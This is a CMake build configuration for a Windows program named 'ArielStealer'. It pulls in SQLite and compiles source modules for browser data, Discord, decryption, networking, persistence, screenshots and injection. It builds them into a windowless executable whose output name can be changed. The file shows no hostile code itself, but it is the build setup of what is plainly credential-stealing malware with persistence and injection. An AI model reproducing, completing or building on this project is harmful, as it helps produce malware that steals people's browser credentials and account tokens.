cmake_minimum_required(VERSION 3.20)
project(ArielStealer LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

if(NOT WIN32)
  message(FATAL_ERROR "ArielStealer targets Windows")
endif()

include(FetchContent)
FetchContent_Declare(sqlite3_amalgamation
  URL https://www.sqlite.org/2024/sqlite-amalgamation-3450300.zip
  DOWNLOAD_EXTRACT_TIMESTAMP TRUE)
FetchContent_GetProperties(sqlite3_amalgamation)
if(NOT sqlite3_amalgamation_POPULATED)
  FetchContent_Populate(sqlite3_amalgamation)
endif()

add_library(sqlite3 STATIC "${sqlite3_amalgamation_SOURCE_DIR}/sqlite3.c")
target_include_directories(sqlite3 PUBLIC "${sqlite3_amalgamation_SOURCE_DIR}")

add_executable(ariel
  src/main.cpp
  src/util.cpp
  src/crypto.cpp
  src/browser.cpp
  src/discord.cpp
  src/config.cpp
  src/archive.cpp
  src/net.cpp
  src/persist.cpp
  src/screenshot.cpp
  src/injection.cpp)

if(EXISTS "${CMAKE_CURRENT_SOURCE_DIR}/src/ariel.rc")
  target_sources(ariel PRIVATE "${CMAKE_CURRENT_SOURCE_DIR}/src/ariel.rc")
endif()

if(NOT DEFINED ARIEL_OUTPUT_NAME OR ARIEL_OUTPUT_NAME STREQUAL "")
  set(ARIEL_OUTPUT_NAME "ariel")
endif()
set_target_properties(ariel PROPERTIES
  OUTPUT_NAME "${ARIEL_OUTPUT_NAME}"
  WIN32_EXECUTABLE TRUE)

target_include_directories(ariel PRIVATE src)
target_compile_definitions(ariel PRIVATE UNICODE _UNICODE WIN32_LEAN_AND_MEAN NOMINMAX)
target_link_libraries(ariel PRIVATE sqlite3 bcrypt crypt32 winhttp advapi32 shell32 ole32 windowscodecs user32)

if(MSVC)
  target_compile_options(ariel PRIVATE /EHa)
  target_link_options(ariel PRIVATE /MANIFEST:NO /ENTRY:wmainCRTStartup)
endif()
